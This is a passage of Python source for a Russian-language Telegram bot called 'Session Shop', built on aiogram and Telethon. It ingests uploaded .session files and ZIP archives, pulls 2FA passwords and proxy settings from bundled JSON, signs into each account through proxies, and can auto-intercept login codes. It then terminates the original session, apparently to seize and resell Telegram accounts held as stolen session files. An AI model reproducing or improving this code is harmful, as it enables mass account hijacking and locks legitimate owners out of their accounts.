    chat_id = call.from_user.id
    current = db.get_clean_mode(chat_id, settings.default_auto_code)
    new_mode = 2 if current == 1 else (0 if current == 2 else 1)
    db.set_clean_mode(chat_id, new_mode)

    await call.message.edit_reply_markup(reply_markup=main_menu_kb(chat_id))
    names = {
        1: "🔄 Миграция (Авто-код)",
        2: f"⚡ Быстрая очистка ({settings.concurrent_workers_per_chat} пот.)",
        0: "📝 Миграция (Ручной код)",
    }
    await call.answer(f"Включен: {names[new_mode]}")


@router.message(Command("fast"))
async def cmd_fast(message: Message):
    db.set_clean_mode(message.chat.id, 2)
    await message.answer(
        f"✅ Включен режим <b>Fast Clean ({settings.concurrent_workers_per_chat} пот.)</b>: "
        "быстрая проверка и очистка.",
        reply_markup=main_menu_kb(message.chat.id),
    )


@router.message(Command("auto"))
async def cmd_auto(message: Message):
    db.set_clean_mode(message.chat.id, 1)
    await message.answer(
        "✅ Включена <b>миграция с авто-перехватом кода и выходом из старой сессии</b>.",
        reply_markup=main_menu_kb(message.chat.id),
    )


@router.message(Command("manual"))
async def cmd_manual(message: Message):
    db.set_clean_mode(message.chat.id, 0)
    await message.answer(
        "✅ Включена <b>миграция с ручным вводом кода</b>.",
        reply_markup=main_menu_kb(message.chat.id),
    )


@router.callback_query(F.data == "skip_current")
async def cb_skip_current(call: CallbackQuery, state: FSMContext):
    chat_id = call.from_user.id
    mig = current_migration.get(chat_id)
    if not mig:
        await call.answer("Нет активной сессии для пропуска.", show_alert=True)
        return

    mig.skip_requested = True
    stats["skipped"] += 1
    await call.answer("Сессия пропущена. Переход к следующей...")
    await cleanup_migration(mig, state)

    if db.count_queue(chat_id) > 0:
        start_queue_worker(chat_id, call.bot, state)


@router.message(Command("new", "create"))
@router.callback_query(F.data == "btn_new_session")
async def cmd_new(event: Message | CallbackQuery, state: FSMContext):
    chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id

    if chat_id in current_migration or db.count_queue(chat_id) > 0:
        text = "❌ Идет обработка. Дождитесь окончания или отмените текущую очередь."
        if isinstance(event, CallbackQuery):
            await event.answer(text, show_alert=True)
        else:
            await event.answer(text)
        return

    await state.set_state(MigrateStates.waiting_phone)
    prompt = "📱 Отправьте номер телефона в международном формате (например, <code>+79001234567</code>):"
    if isinstance(event, CallbackQuery):
        await event.message.answer(prompt, reply_markup=action_kb(can_skip=False))
        await event.answer()
    else:
        await event.answer(prompt, reply_markup=action_kb(can_skip=False))


@router.message(MigrateStates.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    chat_id = message.chat.id
    raw = (message.text or "").strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")

    if raw.startswith("8") and len(raw) == 11:
        raw = "+7" + raw[1:]
    elif not raw.startswith("+"):
        raw = "+" + raw

    if not re.fullmatch(r"\+\d{10,15}", raw):
        await message.answer("❌ Неверный формат. Пример: <code>+79001234567</code>")
        return

    phone = raw
    mig_id = str(uuid.uuid4())[:8]
    status = await message.answer(f"⏳ Создание сессии для <code>{html.escape(phone)}</code>...")

    mig = ActiveMigration(
        id=mig_id,
        chat_id=chat_id,
        phone=phone,
        status_message=status,
        is_new_session=True,
        waiting_manual_code=True,
        proxy_config=None,
    )
    current_migration[chat_id] = mig

    try:
        mig.proxy_config = await resolve_live_proxy(None)
        mig.temp_dir = Path(tempfile.mkdtemp(prefix=f"new_{chat_id}_{mig_id}_"))
        secure_path(mig.temp_dir, 0o700)
        new_client = get_configured_client(str(mig.temp_dir / "new_session"), mig.fingerprint, mig.proxy_config)
        await new_client.connect()
        mig.new_client = new_client

        result = await new_client.send_code_request(phone)
        mig.phone_code_hash = result.phone_code_hash
        mig.last_activity = time.time()
        stats["started"] += 1

        await state.set_state(MigrateStates.waiting_manual_code)
        await status.edit_text(
            f"📩 Код отправлен на <code>{html.escape(phone)}</code>. Отправьте его:",
            reply_markup=action_kb(can_skip=False),
        )

    except FloodWaitError as e:
        await status.edit_text(f"❌ Telegram FloodWait: подождите {e.seconds} с.")
        await cleanup_migration(mig, state)
    except Exception as e:
        logger.exception("Ошибка запроса кода")
        await status.edit_text(f"❌ Ошибка запроса: {html.escape(str(e))}")
        await cleanup_migration(mig, state)


@router.message(Command("cancel"))
@router.callback_query(F.data == "cancel_all")
async def cmd_cancel(event: Message | CallbackQuery, state: FSMContext):
    chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id
    await clear_user_queue(chat_id, state)
    stats["cancelled"] += 1

    text = "🛑 Очередь полностью сброшена, временные файлы удалены."
    if isinstance(event, CallbackQuery):
        await event.message.edit_text(text, reply_markup=main_menu_kb(chat_id))
        await event.answer()
    else:
        await event.answer(text, reply_markup=main_menu_kb(chat_id))


# ====================== ЗАГРУЗКА .SESSION И .ZIP ======================

@router.message(F.document)
async def process_document_upload(message: Message, state: FSMContext):
    chat_id = message.chat.id
    doc: Document = message.document
    upload_name = safe_filename(doc.file_name, "upload.session")
    fname = upload_name.lower()

    if not (fname.endswith(".session") or fname.endswith(".zip")):
        await message.answer("❌ Принимаются файлы <code>.session</code> или <b>.zip архивы</b>.")
        return
    if doc.file_size and doc.file_size > settings.max_upload_bytes:
        await message.answer(
            f"❌ Файл слишком большой. Лимит: <b>{settings.max_upload_bytes // (1024 * 1024)} МБ</b>."
        )
        return

    queued_before = db.count_active_queue(chat_id)
    if queued_before >= settings.max_queue_per_user:
        await message.answer("❌ Достигнут лимит очереди. Дождитесь завершения обработки.")
        return

    temp_dir = create_upload_directory(chat_id)
    archive_file = temp_dir / upload_name
    try:
        await message.bot.download(doc, destination=archive_file)
        secure_path(archive_file)
        if archive_file.stat().st_size > settings.max_upload_bytes:
            raise ValueError("downloaded file exceeds MAX_UPLOAD_BYTES")
    except Exception as exc:
        shutil.rmtree(temp_dir, ignore_errors=True)
        logger.warning("Не удалось загрузить файл %s: %s", upload_name, exc)
        await message.answer("❌ Не удалось скачать файл из Telegram. Попробуйте ещё раз.")
        return

    queue_items: list[dict[str, Any]] = []

    if fname.endswith(".zip"):
        try:
            safe_extract_session_archive(
                archive_file,
                temp_dir,
                max_members=settings.max_archive_members,
                max_uncompressed_bytes=settings.max_archive_uncompressed_bytes,
            )
            sessions = find_session_files(temp_dir)
            if not sessions:
                await message.answer("❌ В архиве не обнаружено файлов <code>.session</code>.")
                shutil.rmtree(temp_dir, ignore_errors=True)
                return
            invalid_sessions = [path.name for path in sessions if not is_sqlite_session(path)]
            if invalid_sessions:
                await message.answer(
                    "❌ Архив содержит файл с расширением <code>.session</code>, "
                    "который не является SQLite-сессией Telethon."
                )
                shutil.rmtree(temp_dir, ignore_errors=True)
                return
            available_slots = settings.max_queue_per_user - queued_before
            if len(sessions) > available_slots:
                await message.answer(
                    f"❌ В архиве {len(sessions)} сессий, но в очереди осталось "
                    f"только {available_slots} мест."
                )
                shutil.rmtree(temp_dir, ignore_errors=True)
                return

            for s_path in sessions:
                json_path = s_path.with_suffix(".json")
                auto_pass = None
                proxy_dict = None
                if json_path.exists():
                    try:
                        j_data = json.loads(json_path.read_text(encoding="utf-8"))
                        if isinstance(j_data, dict):
                            auto_pass = (
                                j_data.get("twoFA")
                                or j_data.get("password")
                                or j_data.get("2fa")
                            )
                            proxy_dict = parse_session_proxy(j_data)
                    except (OSError, UnicodeError, json.JSONDecodeError):
                        logger.warning("Некорректный JSON рядом с %s", s_path.name)

                queue_items.append(
                    {
                        "id": str(uuid.uuid4())[:8],
                        "chat_id": chat_id,
                        "file_path": str(s_path),
                        "original_name": s_path.name,
                        "auto_2fa": str(auto_pass) if auto_pass else None,
                        "proxy_dict": proxy_dict,
                    }
                )

        except ArchiveValidationError as exc:
            await message.answer(f"❌ Небезопасный ZIP-архив: {html.escape(str(exc))}")
            shutil.rmtree(temp_dir, ignore_errors=True)
            return
        except Exception:
            logger.exception("Ошибка обработки ZIP-архива")
            await message.answer("❌ Не удалось обработать ZIP-архив.")
            shutil.rmtree(temp_dir, ignore_errors=True)
            return
    else:
        if not is_sqlite_session(archive_file):
            shutil.rmtree(temp_dir, ignore_errors=True)
            await message.answer(
                "❌ Файл не является SQLite-сессией Telethon."
            )
            return
        queue_items.append(
            {
                "id": str(uuid.uuid4())[:8],
                "chat_id": chat_id,
                "file_path": str(archive_file),
                "original_name": upload_name,
                "auto_2fa": None,
                "proxy_dict": None,
            }
        )

    try:
        db.add_queue_items(queue_items, max_active=settings.max_queue_per_user)
    except QueueLimitError:
        shutil.rmtree(temp_dir, ignore_errors=True)
        await message.answer(
            "❌ Очередь успела заполниться. Повторите загрузку после завершения заданий."
        )
        return
    except Exception:
        logger.exception("Не удалось сохранить задания в SQLite")
        shutil.rmtree(temp_dir, ignore_errors=True)
        await message.answer("❌ Не удалось добавить файлы в очередь.")
        return

    added_count = len(queue_items)
    stats["started"] += added_count
    total_queue = db.count_active_queue(chat_id)

    await message.answer(
        f"📥 Сессий добавлено в SQLite: <b>{added_count}</b>\n"
        f"Всего в очереди: <b>{total_queue}</b>",
        reply_markup=action_kb(
            can_skip=db.get_clean_mode(chat_id, settings.default_auto_code) != 2
        ),
    )

    if not queue_workers.get(chat_id, False):
        start_queue_worker(chat_id, message.bot, state)


@router.message(MigrateStates.waiting_manual_code)
async def process_manual_code(message: Message, state: FSMContext):
    chat_id = message.chat.id
    code = (message.text or "").strip().replace(" ", "").replace("-", "")
    await delete_sensitive_message(message)

    mig = current_migration.get(chat_id)
    if not mig or not mig.new_client or not mig.waiting_manual_code:
        await message.answer("Нет сессий, ожидающих ввода кода.")
        return

    if not code.isdigit() or not (4 <= len(code) <= 8):
        await message.answer("❌ Код должен содержать от 4 до 8 цифр.")
        return

    status = await message.answer("⏳ Авторизация...")
    try:
        await mig.new_client.sign_in(phone=mig.phone, code=code, phone_code_hash=mig.phone_code_hash)

        success, err = await terminate_old_session(mig.old_client)
        mig.old_session_terminated = success
        mig.old_session_error = err
        mig.old_client = None

        mig.waiting_manual_code = False
        await state.clear()
        await finalize(mig, status, state)

        if db.count_queue(chat_id) > 0:
            start_queue_worker(chat_id, message.bot, state)

    except SessionPasswordNeededError:
        if mig.auto_2fa_password:
            try:
                await mig.new_client.sign_in(password=mig.auto_2fa_password)

                success, err = await terminate_old_session(mig.old_client)
                mig.old_session_terminated = success
                mig.old_session_error = err
                mig.old_client = None

                mig.waiting_manual_code = False
                await state.clear()
                await finalize(mig, status, state)
                if db.count_queue(chat_id) > 0:
                    start_queue_worker(chat_id, message.bot, state)
                return
            except Exception:
                pass

        mig.waiting_manual_code = False
        mig.waiting_2fa = True
        mig.last_activity = time.time()
        await state.set_state(MigrateStates.waiting_password)
        await status.edit_text("🔒 Аккаунт защищен 2FA-паролем. Отправьте его:", reply_markup=action_kb(can_skip=True))
    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
        await status.edit_text(f"❌ Неверный или истекший код: {html.escape(str(e))}")
    except Exception as e:
        await status.edit_text(f"❌ Сбой авторизации: {html.escape(str(e))}")


@router.message(MigrateStates.waiting_password)
async def process_2fa(message: Message, state: FSMContext):
    chat_id = message.chat.id
    password = (message.text or "").strip()
    await delete_sensitive_message(message)

    mig = current_migration.get(chat_id)
    if not mig or not mig.new_client or not mig.waiting_2fa:
        await message.answer("Нет сессий, ожидающих пароль 2FA.")
        return

    status = await message.answer("⏳ Проверка 2FA...")
    try:
        await mig.new_client.sign_in(password=password)

        success, err = await terminate_old_session(mig.old_client)
        mig.old_session_terminated = success
        mig.old_session_error = err
        mig.old_client = None

        mig.waiting_2fa = False
        await state.clear()
        await finalize(mig, status, state)

        if db.count_queue(chat_id) > 0:
            start_queue_worker(chat_id, message.bot, state)

    except PasswordHashInvalidError:
        await status.edit_text("❌ Пароль 2FA не подходит. Попробуйте еще раз:")
    except Exception as e:
        await status.edit_text(f"❌ Ошибка 2FA: {html.escape(str(e))}")
        await cleanup_migration(mig, state)


@router.message(Command("rc"))
async def cmd_rc(message: Message):
    if not is_admin(message.from_user.id):
        return
    parts = (message.text or "").split()
    arg = parts[1].lower() if len(parts) > 1 else ""
    if arg in ("on", "вкл", "1"):
        set_rc_referral(True)
    elif arg in ("off", "выкл", "0"):
        set_rc_referral(False)
    elif arg:
        await message.answer("Использование: <code>/rc on</code> | <code>/rc off</code> | <code>/rc</code> (статус)")
        return
    state = "✅ включена" if is_rc_referral_enabled() else "⛔ выключена"
    await message.answer(f"🎟️ Рефералка RCBet: <b>{state}</b>\nКоманды: <code>/rc on</code> | <code>/rc off</code>")


@router.message(Command("stats"))
async def cmd_stats(message: Message):
    total_in_db = db.count_all_pending()

    await message.answer(
        f"📊 <b>Статистика Session Shop</b>\n\n"
        f"• Всего запусков: {stats['started']}\n"
        f"• Успешно очищено: {stats['success']}\n"
        f"• Пропущено оператором: {stats['skipped']}\n"
        f"• Ошибок (в карантине): {stats['failed']}\n"
        f"• Отменено: {stats['cancelled']}\n"
        f"• В SQLite очереди: {total_in_db}"
    )


# ====================== ФОНОВЫЙ ТАЙМАУТ-ВОТЧДОГ ======================

async def watchdog_task(bot: Bot):
    while True:
        await asyncio.sleep(60)
        now = time.time()
        timeout_sec = settings.session_timeout_minutes * 60
        stale_chats = []

        for chat_id, mig in list(current_migration.items()):
            if (mig.waiting_2fa or mig.waiting_manual_code) and (now - mig.last_activity > timeout_sec):
                stale_chats.append(chat_id)

        for chat_id in stale_chats:
            mig = current_migration.get(chat_id)
            if mig:
                logger.info(f"Таймаут сессии для chat_id {chat_id}")
                try:
                    await bot.send_message(chat_id, "⌛ Время ожидания кода/2FA истекло. Сессия сброшена.")
                except Exception:
                    pass
                await cleanup_migration(mig)


# ====================== ТОЧКА ВХОДА И SHUTDOWN ======================

async def shutdown(bot: Bot):
    logger.info("Завершение работы: отключение активных сессий...")
    for task in list(background_tasks):
        task.cancel()
    if background_tasks:
        await asyncio.gather(*list(background_tasks), return_exceptions=True)
    for mig in list(current_migration.values()):
        await cleanup_migration(mig, remove_queue_item=False)
    await bot.session.close()
    logger.info("Все ресурсы корректно освобождены.")


async def main():
    bot = ResilientBot(
        token=settings.bot_token,
        default=DefaultBotProperties(parse_mode="HTML"),
    )
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    watchdog = asyncio.create_task(watchdog_task(bot))

    logger.info("Session Shop bot успешно запущен")
    try:
        await dp.start_polling(bot, close_bot_session=False)
    finally:
        watchdog.cancel()
        with suppress(asyncio.CancelledError):
            await watchdog
        await shutdown(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Бот остановлен.")
